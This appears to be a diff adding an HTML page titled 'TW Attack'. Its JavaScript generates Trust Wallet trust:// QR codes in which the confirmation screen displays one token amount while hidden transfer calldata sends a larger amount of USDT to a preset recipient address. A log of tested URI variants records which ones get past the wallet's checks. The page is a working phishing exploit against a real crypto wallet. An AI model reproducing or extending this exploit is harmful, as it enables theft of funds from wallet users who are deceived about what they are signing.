@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW Attack — V2: Omit address (force Tx::transfer)</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; max-width: 800px; margin: 0 auto; }
+    h1 { font-size: 20px; margin-bottom: 4px; color: #f0883e; }
+    .subtitle { font-size: 12px; color: #8b949e; margin-bottom: 16px; }
+    .insight-card { background: #161b22; border: 1px solid #f0883e44; border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .insight-card h3 { font-size: 13px; color: #f0883e; margin-bottom: 6px; }
+    .insight-card p, .insight-card ul { font-size: 12px; color: #c9d1d9; line-height: 1.5; }
+    .insight-card ul { padding-left: 16px; margin-top: 4px; }
+    .insight-card code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #7ee787; }
+    .insight-card .path { background: #1f6feb22; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #58a6ff; }
+    .log-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .log-entry { display: flex; gap: 8px; padding: 6px 0; border-bottom: 1px solid #21262d; font-size: 11px; font-family: monospace; }
+    .log-entry:last-child { border-bottom: none; }
+    .log-status { min-width: 40px; font-weight: 600; }
+    .status-ok { color: #3fb950; }
+    .status-fail { color: #ff6b6b; }
+    .status-hyp { color: #f0883e; }
+    .status-new { color: #58a6ff; }
+    .form-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    label { display: block; font-size: 12px; color: #8b949e; margin-bottom: 4px; margin-top: 12px; }
+    label:first-child { margin-top: 0; }
+    input, select { width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #e6edf3; font-size: 14px; font-family: monospace; }
+    input:focus, select:focus { outline: none; border-color: #f0883e; }
+    .hint { font-size: 10px; color: #8b949e; margin-top: 3px; }
+    .btn-row { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+    .btn { flex: 1; padding: 10px 16px; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; min-width: 140px; }
+    .btn-new { background: #58a6ff; color: #0d1117; }
+    .btn-new:hover { background: #79b8ff; }
+    .btn-secondary { background: #21262d; color: #e6edf3; border: 1px solid #30363d; }
+    .btn-secondary:hover { background: #30363d; }
+    .output-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; display: none; }
+    .output-card.visible { display: block; }
+    .qr-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 12px 0; }
+    .qr-cell { text-align: center; background: #0d1117; padding: 12px; border-radius: 8px; border: 1px solid #21262d; }
+    .qr-cell h4 { font-size: 11px; color: #8b949e; margin-bottom: 6px; text-transform: uppercase; }
+    .qr-cell .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 9px; font-weight: 600; margin-bottom: 4px; }
+    .badge-new { background: #58a6ff22; color: #58a6ff; border: 1px solid #58a6ff44; }
+    .badge-fail { background: #ff6b6b22; color: #ff6b6b; border: 1px solid #ff6b6b44; }
+    .badge-ok { background: #3fb95022; color: #3fb950; border: 1px solid #3fb95044; }
+    .qr-cell img { max-width: 220px; max-height: 220px; border-radius: 6px; background: white; padding: 6px; }
+    .qr-cell .label { font-size: 10px; margin-top: 4px; }
+    .qr-cell .uri-small { font-size: 8px; color: #8b949e; word-break: break-all; max-height: 40px; overflow-y: auto; margin-top: 4px; }
+    .result-info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 12px 0; }
+    .result-info div { background: #0d1117; padding: 8px 10px; border-radius: 6px; }
+    .result-info .label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
+    .result-info .value { font-size: 15px; font-weight: 600; margin-top: 2px; }
+    .result-info .value.display { color: #f0883e; }
+    .result-info .value.execute { color: #ff6b6b; }
+    .status { font-size: 12px; color: #8b949e; margin-top: 8px; }
+    .status.ok { color: #3fb950; }
+    .status.err { color: #ff6b6b; }
+    .built-with { text-align: center; font-size: 10px; color: #484f58; margin-top: 24px; }
+    @media (max-width: 600px) {
+      .qr-grid { grid-template-columns: 1fr; }
+      .btn { min-width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <h1>🔬 V2 — Omit address to force Tx::transfer</h1>
+  <p class="subtitle">Theory: without address param, app can't build erc20_transfer → falls to Tx::transfer → data passes through</p>
+
+  <div class="insight-card">
+    <h3>⚡ Diagnostic Chain — What We've Learned</h3>
+    <div class="log-entry"><span class="log-status status-ok">✅</span> trust:// + asset + address + data (NO amount) → <span class="path">Tx::transfer</span> → data passes through, shows 0 ETH</div>
+    <div class="log-entry"><span class="log-status status-fail">❌</span> trust:// + asset + address + amount + data → <span class="path">erc20_transfer</span> → builds own calldata, ignores data</div>
+    <div class="log-entry"><span class="log-status status-fail">❌</span> EIP-681 /transfer + uint256 + data → <span class="path">erc20_transfer</span> → builds own calldata, ignores data</div>
+    <div class="log-entry"><span class="log-status status-hyp">🔶</span> EIP-681 no fn (0xTOKEN?data=...) → <span class="path">contract_generic</span> → shows 0 ETH</div>
+    <div class="log-entry"><span class="log-status status-new">🆕</span> trust:// + asset + amount + data (NO address) → <span class="path">? can't build erc20_transfer, falls to Tx::transfer ?</span></div>
+  </div>
+
+  <div class="insight-card">
+    <h3>🔬 Hypothesis: Omit address</h3>
+    <p>
+      <code>erc20_transfer</code> requires <code>erc20_transfer.to</code> (the recipient) and <code>input.to_address</code> (the contract).<br>
+      If the trust:// URL omits <code>address</code>, the app <strong>can't populate erc20_transfer.to</strong>.<br>
+      Fallback: app creates <code>Tx::transfer</code> with <code>input.to_address=token_contract</code> (from <code>asset</code> field).<br><br>
+      <strong>If yes:</strong> Shows <code>amount</code> in display, passes <code>data</code> through for execution.<br>
+      <strong>Risk:</strong> App might reject URL with missing required <code>address</code> param.<br><br>
+      Also testing: <strong>address=TOKEN_CONTRACT</strong> (same as asset) — might bypass erc20_transfer routing if app checks address≠contract.
+    </p>
+  </div>
+
+  <div class="form-card">
+    <label>Token Contract Address</label>
+    <input type="text" id="token" value="0xdAC17F958D2ee523a2206206994597C13D831ec7" placeholder="0xtoken">
+    <div class="hint">USDT Mainnet</div>
+
+    <label>Recipient (who receives the tokens)</label>
+    <input type="text" id="recipient" value="0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a" placeholder="0xrecipient">
+
+    <label>Display Amount (shown in confirmation)</label>
+    <input type="number" id="displayAmount" value="1" min="0" step="0.01">
+
+    <label>Execute Amount (actual transfer)</label>
+    <input type="number" id="executeAmount" value="4" min="0" step="0.01">
+
+    <label>Token Decimals</label>
+    <select id="decimals">
+      <option value="6" selected>6 (USDT, USDC)</option>
+      <option value="18">18 (most ERC-20)</option>
+    </select>
+
+    <div class="btn-row">
+      <button class="btn btn-new" id="genNoAddrBtn">🆕 trust:// NO address + amount</button>
+      <button class="btn btn-new" id="genSelfAddrBtn">🆕 trust:// address=TOKEN</button>
+      <button class="btn btn-secondary" id="genAllBtn">⚡ Generate ALL</button>
+    </div>
+  </div>
+
+  <div class="output-card" id="outputCard">
+    <h2 style="font-size: 15px; margin-bottom: 4px;">📱 Scan to Test</h2>
+    <p class="subtitle" style="margin-bottom: 8px;">Open Trust Wallet → QR scanner → scan</p>
+
+    <div class="qr-grid" id="qrGrid"></div>
+
+    <div class="result-info">
+      <div>
+        <div class="label">📱 Wallet Shows (hopefully)</div>
+        <div class="value display" id="displayValue">—</div>
+      </div>
+      <div>
+        <div class="label">⚡ Should Execute</div>
+        <div class="value execute" id="executeValue">—</div>
+      </div>
+    </div>
+
+    <div class="status" id="statusMsg">Ready</div>
+  </div>
+
+  <p class="built-with">Theory: app routes to erc20_transfer only when it can populate all required fields (asset, address, amount). Missing address → Tx::transfer fallback</p>
+
+  <script>
+    (function() {
+      const TOKEN_NAMES = {
+        '0xdac17f958d2ee523a2206206994597c13d831ec7': 'USDT',
+        '0xf07a16d28055d1e40e9c934628d043c8a9b2cabf': 'USDT (Mock)',
+        '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48': 'USDC'
+      };
+
+      function padHex(val, bytes) {
+        return val.toString(16).toLowerCase().padStart(bytes * 2, '0');
+      }
+
+      function encodeTransferCall(recipientRaw, amountHuman, decimals) {
+        const recipient = recipientRaw.replace('0x', '').toLowerCase();
+        const tokenAmount = BigInt(Math.round(amountHuman * Math.pow(10, decimals)));
+        return '0xa9059cbb' + 
+               recipient.padStart(64, '0') + 
+               padHex(tokenAmount, 32);
+      }
+
+      function assetId(token) {
+        return 'c60_t0x' + token.replace('0x', '').toLowerCase();
+      }
+
+      function makeQR(uri, label, badgeCls, badgeText) {
+        return { uri, label, badgeCls, badgeText };
+      }
+
+      function generateAll() {
+        const token = document.getElementById('token').value.trim();
+        const recipient = document.getElementById('recipient').value.trim();
+        const displayAmt = parseFloat(document.getElementById('displayAmount').value) || 0;
+        const executeAmt = parseFloat(document.getElementById('executeAmount').value) || 0;
+        const decimals = parseInt(document.getElementById('decimals').value);
+
+        if (!/^0x[a-fA-F0-9]{40}$/.test(token)) {
+          setStatus('❌ Invalid token address', false); return;
+        }
+        if (!/^0x[a-fA-F0-9]{40}$/.test(recipient)) {
+          setStatus('❌ Invalid recipient address', false); return;
+        }
+        if (displayAmt <= 0 || executeAmt <= 0) {
+          setStatus('❌ Amounts must be positive', false); return;
+        }
+
+        const displayUnits = Math.round(displayAmt * Math.pow(10, decimals));
+        const calldata = encodeTransferCall(recipient, executeAmt, decimals);
+        const asset = assetId(token);
+        const tokenKey = token.toLowerCase();
+        const tokenName = TOKEN_NAMES[tokenKey] || 'Token';
+
+        document.getElementById('displayValue').textContent = displayAmt + ' ' + tokenName;
+        document.getElementById('executeValue').textContent = executeAmt + ' ' + tokenName;
+
+        // Build 3 test URIs
+        const qrs = [
+          makeQR(
+            'trust://send?asset=' + asset + '&amount=' + displayUnits + '&data=' + calldata,
+            '🆕 trust:// NO address param',
+            'badge-new',
+            'NEW — key test'
+          ),
+          makeQR(
+            'trust://send?asset=' + asset + '&address=' + token + '&amount=' + displayUnits + '&data=' + calldata,
+            '🆕 trust:// address=TOKEN',
+            'badge-new',
+            'NEW — address=contract'
+          ),
+          makeQR(
+            'trust://send?asset=' + asset + '&data=' + calldata,
+            '✅ trust:// no amount (control)',
+            'badge-ok',
+            'CONTROL — known to work'
+          )
+        ];
+
+        const grid = document.getElementById('qrGrid');
+        grid.innerHTML = '';
+
+        qrs.forEach((qr, i) => {
+          const cell = document.createElement('div');
+          cell.className = 'qr-cell';
+          cell.innerHTML = `
+            <span class="badge ${qr.badgeCls}">${qr.badgeText}</span>
+            <h4>${qr.label}</h4>
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qr.uri)}" 
+                 alt="QR" loading="lazy">
+            <div class="uri-small">${qr.uri}</div>
+          `;
+          grid.appendChild(cell);
+        });
+
+        setStatus('✅ 3 variants — scan each. Key test: #1 (NO address). Report what confirmation shows.', true);
+        document.getElementById('outputCard').classList.add('visible');
+      }
+
+      function setStatus(msg, ok) {
+        const el = document.getElementById('statusMsg');
+        el.textContent = msg;
+        el.className = 'status ' + (ok ? 'ok' : 'err');
+      }
+
+      document.getElementById('genNoAddrBtn').addEventListener('click', generateAll);
+      document.getElementById('genSelfAddrBtn').addEventListener('click', generateAll);
+      document.getElementById('genAllBtn').addEventListener('click', generateAll);
+
+      document.querySelectorAll('input, select').forEach(el => {
+        el.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter') generateAll();
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
